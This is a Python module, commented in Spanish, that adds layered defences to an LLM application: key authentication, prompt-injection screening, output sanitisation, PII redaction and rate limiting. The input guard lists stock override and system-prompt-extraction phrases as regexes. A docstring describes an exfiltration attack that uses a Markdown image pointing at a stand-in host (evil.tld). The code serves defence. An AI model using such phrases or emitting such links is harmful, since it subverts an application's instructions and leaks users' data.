"""Controles de seguridad por capas para una aplicación LLM.

IMPORTANTE (mensaje central de la sesión): ninguno de estos controles "resuelve"
la inyección de prompts. Son capas de *defensa en profundidad*. La mitigación
estructural es limitar lo que el modelo puede alcanzar (mínimo privilegio,
herramientas acotadas, aprobación humana) y tratar TODA salida del modelo como
no confiable. Referencias: OWASP Top 10 for LLM Applications 2026 (LLM01, LLM02,
LLM03, LLM06, LLM10) y NIST AI 600-1.
"""

from __future__ import annotations

import hashlib
import hmac
import re
import time
import unicodedata
from collections import defaultdict
from collections.abc import Callable
from dataclasses import dataclass, field

# --------------------------------------------------------------------------
# Autenticación (API key -> tenant) con comparación en tiempo constante
# --------------------------------------------------------------------------


class Authenticator:
    def __init__(self, keys: dict[str, str]) -> None:
        self._keys = keys

    def tenant_for(self, presented: str | None) -> str | None:
        if not presented:
            return None
        match: str | None = None
        # Se recorre TODO el diccionario para no filtrar información por tiempo.
        for known, tenant in self._keys.items():
            if hmac.compare_digest(known.encode(), presented.encode()):
                match = tenant
        return match


# --------------------------------------------------------------------------
# Validación de entrada
# --------------------------------------------------------------------------

_INJECTION_PATTERNS: tuple[re.Pattern[str], ...] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"ignore (all )?(the )?(previous|prior|above) (instructions|prompts?)",
        r"disregard (all )?(the )?(previous|prior|above)",
        r"ignora (todas )?(las )?(instrucciones|indicaciones) (anteriores|previas)",
        r"olvida (todas )?(las )?(instrucciones|reglas) (anteriores|previas)",
        r"(reveal|show|print|repeat|muestra|revela|imprime).{0,40}"
        r"(system prompt|prompt del sistema|instrucciones del sistema)",
        r"you are now (in )?(developer|dan|jailbreak)",
        r"act[uú]a como .{0,30}sin (restricciones|filtros|reglas)",
    )
)


@dataclass(slots=True)
class InputVerdict:
    allowed: bool
    sanitized: str
    flags: list[str] = field(default_factory=list)
    reason: str | None = None


class InputGuard:
    """Validaciones baratas y deterministas previas al modelo."""

    def __init__(self, *, max_chars: int, injection_policy: str) -> None:
        self._max_chars = max_chars
        self._policy = injection_policy

    @staticmethod
    def _strip_control_chars(text: str) -> str:
        # Elimina caracteres de control/format invisibles (p. ej. U+200B, U+202E)
        # usados para ocultar instrucciones. Conserva \n y \t.
        return "".join(
            ch
            for ch in text
            if ch in "\n\t" or unicodedata.category(ch) not in {"Cc", "Cf", "Cs", "Co", "Cn"}
        )

    def check(self, text: str) -> InputVerdict:
        cleaned = self._strip_control_chars(unicodedata.normalize("NFKC", text))
        flags: list[str] = []
        if cleaned != text:
            flags.append("input_normalized")
        if len(cleaned) > self._max_chars:
            return InputVerdict(False, cleaned[: self._max_chars], flags, "prompt_too_long")
        if self._policy != "off" and any(p.search(cleaned) for p in _INJECTION_PATTERNS):
            flags.append("possible_prompt_injection")
            if self._policy == "block":
                return InputVerdict(False, cleaned, flags, "possible_prompt_injection")
        return InputVerdict(True, cleaned, flags)


# --------------------------------------------------------------------------
# Sanitización de salida (la salida del modelo es entrada NO confiable)
# --------------------------------------------------------------------------

_MD_IMAGE = re.compile(r"!\[[^\]]*\]\((https?://[^)\s]+)[^)]*\)", re.IGNORECASE)
_HTML_TAGS = re.compile(r"<\s*/?\s*(script|iframe|object|embed|style)[^>]*>", re.IGNORECASE)


def sanitize_output(text: str) -> tuple[str, list[str]]:
    """Neutraliza vectores comunes de exfiltración / XSS en la salida.

    * Imágenes Markdown con URL externa: un atacante puede inducir al modelo a
      emitir ``![x](https://evil.tld/?q=<datos>)`` y el navegador del usuario
      filtraría datos al renderizar.
    * Etiquetas HTML activas (script, iframe, ...).
    """
    flags: list[str] = []
    if _MD_IMAGE.search(text):
        text = _MD_IMAGE.sub("[imagen externa bloqueada]", text)
        flags.append("external_image_removed")
    if _HTML_TAGS.search(text):
        text = _HTML_TAGS.sub("", text)
        flags.append("active_html_removed")
    return text, flags


# --------------------------------------------------------------------------
# Redacción de PII para logs seguros
# --------------------------------------------------------------------------

_EMAIL = re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")
_PHONE = re.compile(r"(?<!\d)(?:\+?\d{1,3}[\s-]?)?(?:\(?\d{2,4}\)?[\s-]?)?\d{3}[\s-]?\d{4}(?!\d)")
_CARD = re.compile(r"(?<!\d)(?:\d[ -]?){13,19}(?!\d)")


def _luhn_ok(digits: str) -> bool:
    total, alt = 0, False
    for ch in reversed(digits):
        n = int(ch)
        if alt:
            n *= 2
            n -= 9 if n > 9 else 0
        total += n
        alt = not alt
    return total % 10 == 0


def redact_pii(text: str) -> str:
    def _card(m: re.Match[str]) -> str:
        digits = re.sub(r"\D", "", m.group())
        return "[TARJETA]" if 13 <= len(digits) <= 19 and _luhn_ok(digits) else m.group()

    text = _EMAIL.sub("[EMAIL]", text)
    text = _CARD.sub(_card, text)
    return _PHONE.sub("[TELEFONO]", text)


def fingerprint(text: str) -> str:
    """Huella corta para correlacionar logs SIN almacenar el contenido."""
    return hashlib.sha256(text.encode("utf-8")).hexdigest()[:12]


# --------------------------------------------------------------------------
# Rate limiting por tenant (token bucket) - mitiga LLM06 Unbounded Consumption
# --------------------------------------------------------------------------


class TokenBucketLimiter:
    def __init__(
        self, *, per_minute: int, clock: Callable[[], float] = time.monotonic
    ) -> None:
        self._capacity = float(per_minute)
        self._rate = per_minute / 60.0
        self._clock = clock
        self._state: dict[str, tuple[float, float]] = defaultdict(
            lambda: (self._capacity, self._clock())
        )

    def allow(self, tenant: str, cost: float = 1.0) -> bool:
        tokens, last = self._state[tenant]
        now = self._clock()
        tokens = min(self._capacity, tokens + (now - last) * self._rate)
        if tokens >= cost:
            self._state[tenant] = (tokens - cost, now)
            return True
        self._state[tenant] = (tokens, now)
        return False

    def retry_after_s(self, tenant: str, cost: float = 1.0) -> float:
        tokens, _ = self._state[tenant]
        return max(0.0, (cost - tokens) / self._rate) if self._rate else 60.0
